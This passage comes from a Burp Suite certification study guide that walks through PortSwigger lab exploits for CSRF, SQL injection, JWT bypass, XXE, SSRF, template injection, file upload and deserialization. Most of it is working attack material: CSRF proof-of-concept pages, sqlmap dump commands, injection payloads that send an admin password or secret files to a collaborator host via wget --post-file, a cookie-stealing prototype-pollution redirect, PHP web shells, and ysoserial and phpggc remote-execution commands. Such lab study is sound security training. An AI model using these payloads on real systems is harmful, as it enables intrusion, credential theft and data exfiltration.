>***Identify*** change email function is vulnerable to CSRF by observing when the **referer** header value is accepted as long as the referrer value contains the expected target domain somewhere in the value.  

>Adding original domain of target and append it to the **Referer header** in the form of a query string, allow the change email to update.  

```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```  

>**Note:** Unlike the normal Referer header spelling, the word **"referrer"** must be spelled correctly in the above code^^.  

![referer csrf](images/referer-csrf.png)  

>Create a CSRF proof of concept exploit and host it on the exploit server. Edit the JavaScript so that the third argument of the **history.pushState()** function includes a query string with target URL.  

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://TARGET.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;exploit&#45;0a9b0032032ecf88c67e341501e00081&#46;exploit&#45;server&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?TARGETDOMAIN.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```  

>When above exploit payload is delivered to victim, the CSRF POC payload changes the victim email to **hacker@exploit.net**, because the referer header contained target in value.  

[PortSwigger Lab: CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)  
  
## LastSearchTerm  

>***Identify*** the CSRF vulnerability where token not tied to non-session cookie, by changing the **csrfkey** cookie and seeing the result that the request is rejected. Observe the **LastSearchTerm** cookie value containing the user supplied input from the search parameter.  

![identify-csrf-non-session-tied.png](images/identify-csrf-non-session-tied.png)  

>Search function has no CSRF protection, create below payload that injects new line characters ```%0d%0a``` to set new cookie value in response, and use this to inject cookies into the victim user's browser.  

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None
```  

>Generate CSRF POC, Enable the option to include an **auto-submit** script and click **Regenerate**. Replace the **auto-submit** script code block and add following instead, and place ```history.pushState``` script code below body header. The **onerror** of the img src tag will instead submit the CSRF POC.  

```
<img src="https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```  

>During BSCP **Exam** set the email change value to that of the exploit server ***hacker@exploit-server.net*** email address. Then abose the password reset for the administrator.  

![csrf-set-cookie-poc.png](images/csrf-set-cookie-poc.png)  

```html
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="https://TARGET.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;exploit&#45;0a18002e03379f0ccf16180f01180022&#46;exploit&#45;server&#46;net" />
      <input type="hidden" name="csrf" value="48hizVRa9oJ1slhOIPljozUAjqDMdplb" />
      <input type="submit" value="Submit request" />
    </form>
	<img src="https://TARGET.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=NvKm20fiUCAySRSHHSgH7hwonb21oVUZ%3b%20SameSite=None" onerror="document.forms[0].submit()">    
  </body>
</html>
```  

[PortSwigger Lab: CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)  
  
### Is Logged In  
  
>If cookie with the **isloggedin** name is identified, then a refresh of admin password POST request could be exploited. Change username parameter to administrator while logged in as low priv user, CSRF where token is not tied to user session.  

```html
POST /refreshpassword HTTP/1.1
Host: TARGET.web-security-academy.net
Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MCwCFAI9forAezNBAK%2fWxko91dgAiQd1AhQMZgWruKy%2fs0DZ0XW0wkyATeU7aA%3d%3d
Content-Length: 60
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
X-Forwarded-Host: exploit.exploit-server.net
X-Host: exploit.exploit-server.net
X-Forwarded-Server: exploit.exploit-server.net
Referer: https://TARGET.web-security-academy.net/refreshpassword
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

csrf=TOKEN&username=administrator
```  

![CSRF privesc](images/csrf-privesc.png)  

[PortSwigger Lab: Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)  
  
>Target with no defenses against email change function, can allow the privilege escalation to admin role. In exam changing the email to the hacker email address on the exploit server can allow the change of password for the low priv user and can assist in privesc.  

![csrf-change-email.png](images/csrf-change-email.png)  

[PortSwigger Lab: CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)  

>***Indetify*** the Change password do not need the current-password parameter to set a new password, and the user whom password will be changed is based on POST parameter **username**.  

[PortSwigger Lab: Weak isolation on dual-use endpoint](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)  
  
## SQL Injection  

>Error based or Blind SQL injection vulnerabilities, allow SQL queries in an application to be used to extract data or login credentials from the  database. SQLMAP is used to fast track the exploit and retrieve the sensitive information.  

>To identify SQLi, by adding a double (") or single quote (') to web parameters or tracking cookies can break the SQL syntax resulting in error message, and postive SQL injection identification.  

[SQL Injection cheat sheet examples](https://portswigger.net/web-security/sql-injection/cheat-sheet)  

![Identify the input parameter vulnerable to SQL injection](images/identify-sqli-parameter.png)  

### Blind SQLi  

>Target is vulnerable to Out of band data exfiltration using Blind SQL exploitation query. In this case the trackingID cookie.  Below is combined SQL injection with basic XXE payloads.  

```sql
TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.COLLABORATOR.NET/">+%25remote%3b]>'),'/l')+FROM+dual--
```  

![Blind SQL injection with out-of-band data exfil](images/blind-SQL-injection-out-of-band-exfil.png)  
  
[PortSwigger Lab: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)  
  
>Below SQL payload only makes call to collaboration server but no data is exfiltrated.  

```sql
TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLABORATOR.NET/">+%25remote%3b]>'),'/l')+FROM+dual--
```  
  
[PortSwigger Lab: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)  

>Using SQLMAP to enumerate tracking cookie by provding -r REQUESTFILE to Load HTTP request from a file.  

```bash
sqlmap -v -r sqli-blind.txt --batch --random-agent --level=5 --risk=3 -p "TrackingId"
```  

[PortSwigger Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)  

### SQLMAP 

>Sample SQLMAP commands to determine what SQL injection vulnerability exist and retrieving different types of information from backend database.  

[SQLMAP Help usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)  

>SQLMAP determine the vulnerability, and perform initial enumeration.  

```bash
sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --level=3 --risk=3
```  

>SQLMAP determine the database DBMS.  

```bash
sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -dbs
```  

>SQLMAP determine Database, Tables, dump, data Exfiltration.  

```bash
sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -D public --tables
```  

>Dump content from table **users** in the **public** database.  

```
sqlmap -v -u 'https://TARGET.web-security-academy.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --dbms=PostgreSQL -D public -T users --dump --level=5 --risk=3

```  

![SQLMAP used to dump data from tables](images/sqlmap-dump-table-data.png)


>Use SQLMAP Technique parameter set type to error based instead of boolean-based blind vulnerability, and this speed up data exfil process.  

```bash
sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --flush-session --dbms postgresql --technique E --level=5  
```  

### SQLi Manual Exploit  

>SQL injection vulnerability exploited manually by first finding list of **tables** in the database.  

```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```  

>Second retrieve the names of the **columns** in the users table.  

```sql
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_qoixrv'--
```  

>Final step **dump data** from the username and passwords columns.  

```sql
'+UNION+SELECT+username_wrrcyp,+password_zwjmpc+FROM+users_qoixrv--
``` 

![manual-sqli.png](images/manual-sqli.png)  

[PortSwigger Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)  

## JWT  

>JSON web tokens (JWTs) use to send cryptographically signed JSON data, and most commonly used to send information ("claims") about users as part of authentication, session handling, and access control.  

### JWT bypass via JWK  

>The burp scannner ***identify*** vulnerability in server as, **JWT self-signed JWK header supported**. Possible to exploit it through failed check of the provided key source. Exploit steps:  

1. New RSA Key  
2. In request JWT payload, change the value of the **sub claim** to administrator  
3. Select Attack, then select **Embedded JWK** with newly generated RSA key  
4. Observe a ```jwk``` parameter now contain our public key, sending request result in access to admin portal  
  
![jwk header](images/jwk-header.png)  

[PortSwigger Lab: JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)  

### JWT Weak secret  

>Brute force weak JWT signing key  

```bash
hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list 
```  

>Hashcat result provide the secret, to be used to generate a forged signing key.  

[PortSwigger JWT authentication bypass via weak signing key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)  

### JWT kid header  

>JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the **kid** parameter in JWT header to fetch the relevant key from its filesystem. Generate a new **Symmetric Key** and replace **k** property with base64 null byte **AA==**, to be used when signing the JWT.  

>JWS  

```
{
    "kid": "../../../../../../../dev/null",
    "alg": "HS256"
}
```  

>Payload  

```
{
    "iss": "portswigger",
    "sub": "administrator",
    "exp": 1673523674
}
```  

![jwt](images/jwt.png)  

[PortSwigger Lab: JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)  

# Data Exfiltration  

## XXE Injections

>File upload or user import function on web target use XML file format. This can be vulnerable to XML external entity (XXE) injection.  

### Identify XML

>Possible to find XXE attack surface in requests that do not contain any XML.  

>To ***Identify*** XXE in not so obvious parameters or requests, require adding the below and URL encode the **&** symbol to see the response.  

```xml
%26entity;
```  

![Identify XML Injections](images/identify-xxe.png)

### Xinclude file read  

>Webapp **Check Stock** feature use server-side XML document that is server side parsed inside XML document, and request is not constructed of the entire XML document, it is not possible to use a hosted DTD file. Injecting an **XInclude** statement to retrieve the contents of ```/home/carlos/secret``` file instead.  

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>  
```  

![XInclude to retrieve files](images/xinclude.png)  

[PortSwigger Lab: Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)  

### DTD Hosted Exploit  

>On the exploit server host a exploit file with **Document Type Definition (DTD)** extension, containing the following payload.  

```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR.net/?x=%file;'>">
%eval;
%exfil;
```  
  
![Exploit.DTD file hosted](images/exploit.dtd.png)  

>Modify the file upload XML body of the request before sending to the target server.  

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [<!ENTITY % xxe SYSTEM "https://EXPLOIT.net/exploit.dtd"> %xxe;]>
<users>
    <user>
        <username>Carl Toyota</username>
        <email>carl@hacked.net</email>
    </user>    
</users>

```

![Exploiting blind XXE to exfiltrate data usding a mlicious exploit DTD file](images/blind-xxe-exploit-dtd.png)  

[PortSwigger Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)  
  
### SQL + XML + HackVector 

>The combination of vulnerabilities are ***identified*** in a XML Post body and inserting mathematical expression such as **7x7** into field and observing the evaluated value. Using this type of XML and SQL injection with WAF filter bypass via encoding may allow extract of sensitive data.  

![identify-math-evaluated-xml](images/identify-math-evaluated-xml.png)  

>WAF detect attack when appending SQL query such as a UNION SELECT statement to the original store ID. Web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack.

```sql
<storeId>1 UNION SELECT NULL</storeId>
```  

>Bypass the WAF, Use Burp extension **[Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)** to [obfuscate](#obfuscation) the SQL Injection payload in the XML post body. 

![Web application firewall (WAF) bypass require obfuscate of malicious query with Hackvertor](images/hackvertor.png)  

>Webapp return one column, thus need to concatenate the returned usernames and passwords columns from the users table.  
 
```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```  

![SQL injection with filter bypass via XML encoding obfuscation](images/xml-sql-obfuscation.png)  

>Below is sample SQLi payloads to read local file, or output to another folder on target.  

```sql
<@hex_entities>1 UNION all select load_file('/home/carlos/secret')<@/hex_entities>  

<@hex_entities>1 UNION all select load_file('/home/carlos/secret') into outfile '/tmp/secret'<@/hex_entities>
```  

[PortSwigger Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)  
  
### Obfuscation

>URL replacing **.** with %2e  

>Double-encode the injection  

```
/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
```  

>HTML encode one or more of the characters  

```html
<img src=x onerror="&#x61;lert(1)">
```  

>XML encode for bypassing WAFs  

```xml
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
         999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```

>Multiple encodings together  

```html
<a href="javascript:&bsol;u0061lert(1)">Click me</a>
```  

>SQL CHAR  

```sql
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
```

[Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)

## SSRF - Server Side Request Forgery  

>SSRF attack cause the server to make a connection to internal services within the organization, or force the server to connect to arbitrary external systems, potentially leaking sensitive data.  

>SSRF exploitation examples.  

```html
/product/nextProduct?currentProductId=6&path=https://EXPLOIT.net  

stockApi=http://localhost:6566/admin  

http://127.1:6566/admin  
```  

>Double URL encode characters in URL such as to **Obfuscate** the "a" by double-URL encoding it to ```%2561```, resulting in the bypass of blacklist filter.  

![ssrf obfuscated](images/ssrf-obfuscated.png)  

[PortSwigger Lab: SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)  


### Absolute GET URL + HOST SSRF

>Possible to provide an absolute URL in the GET request line and then supply different target for the HOST header.  

```html
GET https://TARGET.web-security-academy.net/
Host: COLLABORATOR.NET
```  

![identify-ssrf-host](images/identify-ssrf-host.png)  

>Use the Host header to target 192.168.0.141 or localhost, and notice the response give 302 status admin interface found. Append /admin to the absolute URL in the request line and send the request. Observe SSRF response.  

![ssrf](images/ssrf.png)  

[PortSwigger Lab: SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)  


### SSRF redirect_uris  

>POST request to register data to the client application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary whitelist of callback URIs. Observe the redirect_uri.  

```html
POST /reg HTTP/1.1
Host: oauth-TARGET.web-security-academy.net
Content-Type: application/json
Content-Length: 206

{
"redirect_uris":["https://example.com"],
    "logo_uri" : "https://Collaborator.com",
	"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
	
}  
```  

![ssrf_redirect_uris.png](images/ssrf_redirect_uris.png)  

[PortSwigger Lab: SSRF via OpenID dynamic client registration](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)  

### XXE + SSRF

>Exploiting XXE to perform SSRF attacks using stock check function that obtains sensitive data.  

```xml

<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:6566/latest/"> ]>
  <stockCheck>
    <productId>
      &xxe;
    </productId>
    <storeId>
      1
    </storeId>
  </stockCheck>  
```  

![xxe-ssrf-localhost.png](images/xxe-ssrf-localhost.png)  

[PortSwigger Lab: Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)  


### SSRF HOST header routing  

>Routing-based SSRF via the Host header allow insecure access to a localhost intranet.  

```html
GET /service/intranet?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&readfile=/home/carlos/secret HTTP/1.1
Host: localhost
```  

>**Note:** Convert the GET request to POST.  

![Routing-based SSRF](images/Routing-based-SSRF.png)  

```html
POST / HTTP/1.1
Host: Collaborator.com
Cookie: _lab=46%7cMCwCFBucXjC6hvd9WC4%2fwP3%2fkmpxu8mhAhR%2f9lrAED4p89w%2bSBi%2fujGmrnwZhjZyG%2fmQebBgi4naIZO%2flg2daYidh0KoLFjVIEV1DKMwigDLRyL4BspAm4Kiz4iRmXJYyTpvojI18biLNQEbid7G4fT6SvZuUjONK2CLqa%2bc8VqLQcU%3d; session=GvdpmebBL2eNQZMJjJmSh4ZU8QrTDVDq
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```  

>***Identified*** SSRF with the help from collaborator as remote server, and this can allow also access to localhost, by changing the **HOST** header.  

[PortSwigger Lab: Routing-based SSRF](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)  

### HTML to PDF  

>**Identify** the source code uses ```JSON.stringify``` to create html and vulnerable to SSRF attack. Partial source code for downloadReport.js.  

```JavaScript
function downloadReport(event, path, param) {

body: JSON.stringify({
  [param]: html
  }
  )
  
```  

```html
<div><p>Report Heading by <img src=”https://Collaborator.com/test.png”></p>
```  

>Identify file download HTML-to-PDF convert function on target is vulnerable.  

```JavaScript
<script>
	document.write('<iframe src=file:///etc/passwd></iframe>');
</script>
```  

>Libraries used to convert HTML files to PDF documents are vulnerable to server-side request forgery (SSRF).  

[PortSwigger Research SSRF](https://portswigger.net/daily-swig/ssrf)  

>Sample code below can be injected on vulnerable implementation of HTML to PDF converter such as wkhtmltopdf to read local file (SSRF).  

```html
<html>
 <body>
  <script>
   x = new XMLHttpRequest;
   x.onload = function() {
    document.write(this.responseText)
   };
   x.open("GET", "file:///home/carlos/secret");
   x.send();
  </script>
 </body>
</html>
```  

>JSON POST request body containing the HTMLtoPDF formatted payload to read local file.  

```JSON
{
	"tableHtml":"<div><p>SSRF in HTMLtoPDF</p><iframe src='file:///home/carlos/secret' height='500' width='500'>"
}
```  

>Random notes on HTML-to-PDF converters & SSRF  

```
"Download report as PDF"
/adminpanel/save-report/
POST request - Body JSON 
{ 
	"tableHtml":"........<html code snip>......."
}

pdf creator: wkhtmltopdf 0.12.5
hacktricks xss cross site scripting server side xss dynamic pdf 
```  

### SSRF Open Redirection  

>The target make **GET** request to the next product on the ecommerce site, using a **path** parameter. On the stockAPI POST request the value provided in body data is the partial path to interal system. The ***identification*** of this vulnerability is by testing various paths and observing the input path specified is reflected in the response **Location** header.  

![SSRF Open Redirect Location reflect](images/ssrf-open-edirect-location-reflect.png)  

```
https://TARGET.web-security-academy.net/product/nextProduct?currentProductId=1&path=http%3a//192.168.0.12%3a8080/admin
```  

>Replace the StockAPI value with the partial path not the absolute URL from above GET request.  

```
stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2f192.168.0.12%253a8080%2fadmin
```  

![SSRF Open Rerdirect](images/ssrf-open-rerdirect.png)  

[PortSwigger Lab: SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)  
  
  
## SSTI - Server Side Template Injection

>Use the web framework native template syntax to inject a malicious payload into a **{{input}}**, which is then executed server-side.  
>SSTI can be ***identified*** using the tool [SSTImap](https://github.com/vladko312/SSTImap) .  

```bash
python /opt/SSTImap/sstimap.py --engine erb -u https://TARGET.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock --os-cmd "cat /home/carlos/secret"
```  

>POST request data param to test and send payload using SSTImap.  

```bash
python /opt/SSTImap/sstimap.py -u https://TARGET.net/product/template?productId=1 --cookie 'session=StolenUserCookie' --method POST --marker fuzzer --data 'csrf=ValidCSRFToken&template=fuzzer&template-action=preview' --engine Freemarker --os-cmd 'cat /home/carlos/secret'
```  

![SSTImap Tool](images/sstimap.png)  

>SSTI payloads to manually ***identify*** vulnerability.  

```
${{<%[%'"}}%\.,
}}{{7*7}} 

{{fuzzer}}
${fuzzer}
${{fuzzer}}

${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
${foobar}

{% debug %}
```  

>***Identification*** of template injection.  

![Identify SSTI](images/identify-ssti.png)  

>Tornado Template  

```
}}
{% import os %}
{{os.system('cat /home/carlos/secret')

blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('cat%20/home/carlos/secret')
```  

![Tornado Template](images/tornado-template.png)  

[PortSwigger Lab: Basic server-side template injection data exfiltrate](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)  

>Django Template  

```
${{<%[%'"}}%\,
{% debug %} 
{{settings.SECRET_KEY}}
```  

![Django template](images/django-template.png)  

[PortSwigger Lab: Server-side template injection with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)  

>Freemarker Template Content-Manager (C0nt3ntM4n4g3r)  

```
${foobar}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /home/carlos/secret") }
```  

![Freemarker template](images/freemarker-template.png)  

[PortSwigger Lab: Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)  


>ERB Template  

```
<%= 7*7 %>
<%= system("cat /home/carlos/secret") %>
```  

![ERB template](images/erb-template.png)  

[PortSwigger Lab: Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)  


>Handlebars Template  

```
${{<%[%'"}}%\,
```  

```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('wget https://COLLABORATOR.net --post-file=/home/carlos/secret');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```

![Handlebars template](images/handlebars-template.png)  

[PortSwigger Lab: Server-side template injection in an unknown language](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)  


[PortSwigger Research SSTI](https://portswigger.net/research/server-side-template-injection)  

>Note: ***Identify*** the Update forgot email template message under the admin_panel at the path /update_forgot_email.  
  
## ProtoType Pollution  

>A target is vulnerable to DOM XSS via client side prototype pollution. **[DOM Invader](#dom-invader)** will identify the gadget and using hosted payload to phish a victim and steal their cookie.  

>Exploit server Body section, host an exploit that will navigate the victim to a malicious URL.  

```html
<script>
    location="https://TARGET.web.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>  
```  

[PortSwigger Lab: Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)

![Proto pollution](images/proto-pollution.png)  

>Proto pollution section is incomplete ...need more input...  
  
## File Path Traversal

>The imagefile parameter is vulnerable to directory traversal path attacks, enabling read access to arbitrary files on the server.

```bash
../../../../../../../../../../
```  

>On the admin portal the images are loaded using **imagefile=** parameter, vulnerable to directory traversal.  

```html
GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```  

![URL encode path traverse](images/encode-path-traverse.png)  

>Burp Intruder provides a predefined payload list (Fuzzing - path traversal).  

[PortSwigger Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)  
  
[PortSwigger Academy File-path-traversal](https://portswigger.net/web-security/file-path-traversal)  

## File Uploads

>A vulnerable image upload function or avatar logo upload, can by exploited and security controls bypassed to upload content to extract sensitive data or execute code server side.  

>***Identify*** any type of file upload.  

![Identify file upload](images/file-upload.png)  

>Content of exploit php 
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```  

>File upload vulnerabilities bypass examples:  
  
1. Upload the file name and include obfuscated path traversal ```..%2fexploit.php``` and retrieve the content ```GET /files/avatars/..%2fexploit.php```  
2. Upload a file named, ```exploit.php%00.jpg``` with trailing null character and get the file execution at ```/files/avatars/exploit.php```  
3. Create polygot using valid image file, and running the command: ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./stickman.png -o polyglot2023.php```. To view the extracted data, issue Get request to ```/files/avatars/polyglot.php``` , and search the response content for the phrase ```START``` to obtain exfiltrated sensitive data.  
4. Upload two files, first ***.htaccess*** with content ```AddType application/x-httpd-php .l33t``` allowing then the upload and execute of second file named, ```exploit.l33t```  
  
![File upload stages](images/file-upload-stages.png)  

[PortSwigger Lab: Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)  
  
## Deserialization  

### CustomTemplate PHP  

>Reading page source code and noticing comment mentioning **<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->**, this ***identify*** possible PHP framework and the Burp scannner identify serialized session cookie object after we logged in with stolen ```wiener:peter``` credentials.  

![info-disclose](images/info-disclose.png)  

>Reviewing PHP source code by adding ***~*** character at end of GET request ```https://target.net/libs/CustomTemplate.php~```, we notice **desctruct** method.  

![comments-in-source-code](images/comments-in-source-code.png)  

>Original Decoded cookie 

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bi0egmdu49lnl9h2gxoj3at4sh3ifh9x";}
```  

>Make new PHP serial CustomTemplate object with the **lock_file_path** attribute set to **/home/carlos/morale.txt**. Make sure to use the correct data type labels and length indicators. The 's' indicate string and the length.

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```  

![modify-serial-cookie](images/modify-serial-cookie.png)  
  
[PortSwigger Lab: Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)  

>**Note:** In BSCP exam not going to run this as it delete file, in exam read source code to ***identify*** the ```unserialize()``` PHP funcition and extract content out-of-band using PHPGGC.  

```
./phpggc Symfony/RCE4 exec 'wget http://Collaborator.com --post-file=/home/carlos/secret' | base64
```  

[PortSwigger Lab: Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)  
  
### YsoSerial  

>Intercept the admin panel page reuqest and identify the cookie named **admin-prefs**.  

![Admin prefs serial cookie](images/admin-prefs-serial-cookie.png)  

>Use below payload in the Deserialization scanner exploiting java jar ysoserial command, to obtain remote code execution (RCE) when payload deserialized on target.  
 
```
CommonsCollections3 'wget http://Collaborator.net --post-file=/home/carlos/secret'
```  

![ysoserial-rce](images/ysoserial-rce.png)  

>Below is ysoserial command line execution to generate base64 encoded serialized cookie object containing payload.  

```bash
java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collaborator.net --post-file=/home/carlos/secret' | base64
```  

[PortSwigger Lab: Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)  
  
# Appendix  

